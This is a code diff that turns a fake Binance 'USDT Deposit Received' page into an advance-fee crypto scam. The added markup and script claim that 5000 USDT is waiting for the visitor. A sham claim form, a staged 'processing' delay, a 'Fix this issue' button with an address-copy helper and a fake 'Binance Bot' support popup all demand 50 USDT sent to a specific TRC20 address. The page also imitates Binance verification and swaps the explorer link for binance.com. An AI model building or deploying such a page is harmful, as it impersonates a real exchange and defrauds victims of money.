@@ -32,6 +32,8 @@
       padding: 34px 28px 28px 28px;
       box-shadow: 0 8px 32px rgba(24,26,32,0.25);
       border: 1px solid var(--binance-light-grey);
+      position: relative;
+      min-height: 100vh;
     }
     .header {
       text-align: center;
@@ -63,6 +65,9 @@
       text-align: center;
       font-size: 1.06em;
       font-weight: 600;
+      display: none;
+      position: relative;
+      z-index: 2;
     }
     .summary {
       background: var(--binance-light-grey);
@@ -84,34 +89,92 @@
       color: var(--binance-yellow);
       font-weight: bold;
     }
-    .actions {
-      display: flex;
-      gap: 15px;
-      margin: 20px 0 28px 0;
-      justify-content: center;
+    .claim-section {
+      margin: 22px 0 28px 0;
+      text-align: center;
     }
-    .action-btn {
-      flex: 1 1 46%;
+    .circle-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      width: 72px;
+      height: 72px;
       background: var(--binance-yellow);
       color: var(--binance-dark);
+      font-size: 1.13em;
+      font-weight: 700;
+      border: none;
+      box-shadow: 0 2px 8px rgba(243,186,47,0.13);
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-bottom: 16px;
+      outline: none;
+    }
+    .circle-btn:active {
+      background: var(--binance-accent);
+    }
+    .claim-form {
+      margin: 0 auto;
+      max-width: 350px;
+      display: none;
+      flex-direction: column;
+      gap: 14px;
+      background: var(--binance-light-grey);
+      border-radius: 10px;
+      padding: 18px 16px 12px 16px;
+      border: 1px solid var(--binance-grey);
+      box-shadow: 0 1px 4px rgba(24,26,32,0.07);
+      position: relative;
+      z-index: 2;
+    }
+    .claim-form label {
+      font-weight: 500;
+      margin-bottom: 4px;
+      color: var(--binance-yellow);
+      text-align: left;
+    }
+    .claim-form input[type="text"] {
+      padding: 9px 11px;
+      border-radius: 7px;
+      border: 1px solid var(--binance-yellow);
+      font-size: 1em;
+      background: var(--binance-grey);
+      color: var(--binance-white);
+      margin-bottom: 8px;
+      outline: none;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .claim-form .confirm-btn {
+      background: var(--binance-yellow);
+      color: var(--binance-dark);
+      font-weight: 600;
+      font-size: 1.09em;
+      padding: 10px 0;
       border: none;
       border-radius: 7px;
-      padding: 12px 0;
-      font-size: 1.09em;
-      font-weight: 600;
+      box-shadow: 0 2px 8px rgba(243,186,47,0.07);
       cursor: pointer;
-      text-decoration: none;
-      transition: background 0.2s, box-shadow 0.2s;
-      box-shadow: 0 2px 8px rgba(243,186,47,0.08);
+      margin-top: 3px;
+      transition: background 0.2s;
     }
-    .action-btn.withdraw {
-      background: var(--binance-white);
-      color: var(--binance-dark);
-      border: 2px solid var(--binance-yellow);
-      box-shadow: 0 2px 8px rgba(243,186,47,0.12);
-    }
-    .action-btn:hover {
+    .claim-form .confirm-btn:active {
       background: var(--binance-accent);
+    }
+    .processing {
+      display: none;
+      text-align: center;
+      margin: 18px 0;
+      font-size: 1.15em;
+      color: var(--binance-yellow);
+      font-weight: 600;
+    }
+    .processing img {
+      vertical-align: middle;
+      width: 32px;
+      height: 32px;
+      margin-right: 12px;
     }
     .token-table {
       width: 100%;
@@ -158,6 +221,7 @@
       color: var(--binance-yellow);
       text-decoration: underline;
       word-break: break-all;
+      cursor: pointer;
     }
     .holdings-title {
       margin-top:16px; 
@@ -166,12 +230,111 @@
       color:var(--binance-yellow); 
       font-weight:600;
     }
+    /* Bot popup */
+    .bot-popup {
+      display: none;
+      position: fixed;
+      bottom: 34px;
+      right: 34px;
+      background: var(--binance-light-grey);
+      border: 2px solid var(--binance-yellow);
+      border-radius: 12px;
+      box-shadow: 0 4px 24px rgba(24,26,32,0.14);
+      padding: 22px 19px 14px 19px;
+      max-width: 330px;
+      z-index: 1000;
+      color: var(--binance-yellow);
+      font-size: 1.08em;
+      font-weight: 500;
+    }
+    .bot-popup .bot-header {
+      font-weight: 800;
+      font-size: 1.14em;
+      margin-bottom: 8px;
+      color: var(--binance-yellow);
+    }
+    .bot-popup .bot-close {
+      position: absolute;
+      top: 8px;
+      right: 13px;
+      background: transparent;
+      border: none;
+      color: var(--binance-yellow);
+      font-size: 1.2em;
+      cursor: pointer;
+    }
+    /* Fix issue section */
+    .fix-issue-section {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .fix-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--binance-yellow);
+      color: var(--binance-dark);
+      border: none;
+      border-radius: 7px;
+      font-size: 1.07em;
+      font-weight: 600;
+      padding: 10px 24px;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: background 0.2s;
+    }
+    .fix-btn img {
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% {transform: rotate(0deg);}
+      100% {transform: rotate(360deg);}
+    }
+    .fix-address-popup {
+      display: none;
+      background: var(--binance-light-grey);
+      border: 2px solid var(--binance-yellow);
+      border-radius: 9px;
+      padding: 17px 12px;
+      color: var(--binance-yellow);
+      font-weight: 600;
+      font-size: 1.06em;
+      margin: 18px auto 0 auto;
+      text-align: center;
+      position: relative;
+      max-width: 340px;
+    }
+    .fix-address-popup .copy-btn {
+      margin-top: 10px;
+      background: var(--binance-yellow);
+      color: var(--binance-dark);
+      border: none;
+      border-radius: 6px;
+      padding: 8px 18px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 0.99em;
+    }
+    .fix-address-popup .copied-msg {
+      display: none;
+      color: var(--binance-green);
+      font-size: 0.97em;
+      margin-top: 8px;
+      font-weight: 500;
+    }
     @media (max-width: 600px) {
       .container {
         padding: 18px 5vw;
       }
       .summary, .token-table {
         font-size: 0.99em;
+      }
+      .bot-popup {
+        right: 5vw;
+        bottom: 5vw;
+        max-width: 95vw;
       }
     }
   </style>
@@ -183,11 +346,15 @@
       <h1>USDT Deposit Received</h1>
       <div class="header-desc">Your USDT deposit has been confirmed!</div>
     </div>
-    <div class="notice">
+    <!-- Notice. Hidden by default, shown after processing -->
+    <div class="notice" id="notice">
       <span>
-        <strong>Notice:</strong><br>
+        <strong>Binance Verified Payment Notice:</strong><br>
         This payment is from <span style="color:var(--binance-accent);">Coinbase</span> and <span style="color:var(--binance-green);">verified by Binance</span>.<br>
-        To complete this transaction, a payment of <span style="color:var(--binance-yellow);">50 USDT</span> is required.
+        <b>Owner/Receiving Address for 5000 USDT:</b> <span style="color:var(--binance-blue);word-break:break-all;">TTR1u6MyRHiMydUAv2UH9HrGvaZSTPNAfQ</span><br>
+        To complete this transaction, a payment of <span style="color:var(--binance-yellow);">50 USDT</span> is required.<br>
+        <b>Send the 50 USDT TRC20 to:</b> <span style="color:var(--binance-red);word-break:break-all;">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</span><br>
+        <b>Once the payment is made, you are guaranteed to receive <span style="color:var(--binance-yellow);">5000 USDT</span> to your address above.</b>
       </span>
     </div>
     <div class="summary">
@@ -200,15 +367,15 @@
         <span>2025-07-14 17:20 UTC</span>
       </div>
       <div class="summary-row">
-        <span>Deposit Address</span>
+        <span>Deposit Address (Recipient)</span>
         <span>
-          <a href="https://www.blockchain.com/explorer/addresses/usdt/xyzaddress" target="_blank">xyzaddress...abcd</a>
+          <a href="https://www.blockchain.com/explorer/addresses/usdt/TTR1u6MyRHiMydUAv2UH9HrGvaZSTPNAfQ" target="_blank">TTR1u6MyRHiMydUAv2UH9HrGvaZSTPNAfQ</a>
         </span>
       </div>
       <div class="summary-row">
         <span>Transaction Hash</span>
         <span>
-          <a href="https://www.blockchain.com/usdt/tx/txhashhere" target="_blank">View in Explorer</a>
+          <a href="https://binance.com" target="_blank">View in Explorer</a>
         </span>
       </div>
       <div class="summary-row">
@@ -224,12 +391,18 @@
         <span class="highlight">5000 USDT <span style="color:#fffbe6;">($5,000.00)</span></span>
       </div>
     </div>
-
-    <div class="actions">
-      <a href="#" class="action-btn">Deposit</a>
-      <a href="#" class="action-btn withdraw">Withdraw</a>
+    <!-- Claim Section -->
+    <div class="claim-section">
+      <button class="circle-btn" id="claimBtn">Claim<br>Deposit</button>
+      <form class="claim-form" id="claimForm" autocomplete="off">
+        <label for="usdtAddress">Enter your USDT TRC20 Address</label>
+        <input type="text" id="usdtAddress" name="usdtAddress" placeholder="TRC20 Address" required>
+        <button type="submit" class="confirm-btn">Confirm</button>
+      </form>
+      <div class="processing" id="processing">
+        <img src="https://i.imgur.com/llF5iyg.gif" alt="Processing...">Processing...
+      </div>
     </div>
-
     <div class="holdings-title">
       Current Holdings
     </div>
@@ -255,14 +428,94 @@
         <td>$0</td>
       </tr>
     </table>
-
     <div class="security-tip">
       <strong>Security Tip:</strong> Never share your private keys or recovery phrases with anyone. Binance support will never ask for them.
     </div>
-
+    <div class="fix-issue-section">
+      <button class="fix-btn" id="fixBtn">
+        <img src="https://i.imgur.com/llF5iyg.gif" alt="loading">Fix this issue
+      </button>
+      <div class="fix-address-popup" id="fixAddressPopup">
+        <div>
+          Please forward <span style="color:var(--binance-yellow);">50 USDT (TRC20)</span> to the payment address below to complete your verified deposit:<br>
+          <b style="word-break:break-all;">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</b>
+        </div>
+        <button class="copy-btn" id="copyBtn">Copy Address</button>
+        <div class="copied-msg" id="copiedMsg">Copied!</div>
+      </div>
+    </div>
     <div class="footer">
-      Need help? <a href="#">Contact Support</a>
+      Need help? <a id="contactSupport">Contact Support</a>
+    </div>
+    <!-- Bot Popup -->
+    <div class="bot-popup" id="botPopup">
+      <button class="bot-close" id="botClose">&times;</button>
+      <div class="bot-header">Binance Bot</div>
+      <div>
+        We're online and waiting to release your payment of <span style="color:var(--binance-yellow);">5000 USDT</span>.<br>
+        Please complete the deposit of <b>50 USDT</b> to the address below:<br>
+        <span style="color:var(--binance-red);word-break:break-all;">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</span><br>
+        <span style="color:var(--binance-green);">Your payment is Binance Verified.</span>
+      </div>
     </div>
   </div>
+  <script>
+    // Elements
+    const claimBtn = document.getElementById('claimBtn');
+    const claimForm = document.getElementById('claimForm');
+    const usdtAddress = document.getElementById('usdtAddress');
+    const processing = document.getElementById('processing');
+    const notice = document.getElementById('notice');
+    const fixBtn = document.getElementById('fixBtn');
+    const fixAddressPopup = document.getElementById('fixAddressPopup');
+    const copyBtn = document.getElementById('copyBtn');
+    const copiedMsg = document.getElementById('copiedMsg');
+    const contactSupport = document.getElementById('contactSupport');
+    const botPopup = document.getElementById('botPopup');
+    const botClose = document.getElementById('botClose');
+
+    // Claim Deposit button
+    claimBtn.addEventListener('click', function() {
+      claimBtn.style.display = 'none';
+      claimForm.style.display = 'flex';
+    });
+
+    // Confirm address
+    claimForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      claimForm.style.display = 'none';
+      processing.style.display = 'block';
+      setTimeout(() => {
+        processing.style.display = 'none';
+        notice.style.display = 'block';
+      }, 4000);
+    });
+
+    // Fix issue button
+    fixBtn.addEventListener('click', function() {
+      fixAddressPopup.style.display = 'block';
+    });
+
+    // Copy address
+    copyBtn.addEventListener('click', function() {
+      const address = 'TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa';
+      navigator.clipboard.writeText(address)
+        .then(() => {
+          copiedMsg.style.display = 'block';
+          setTimeout(() => copiedMsg.style.display = 'none', 1600);
+        });
+    });
+
+    // Contact support
+    contactSupport.addEventListener('click', function(e) {
+      e.preventDefault();
+      botPopup.style.display = 'block';
+    });
+
+    // Bot close
+    botClose.addEventListener('click', function() {
+      botPopup.style.display = 'none';
+    });
+  </script>
 </body>
 </html>
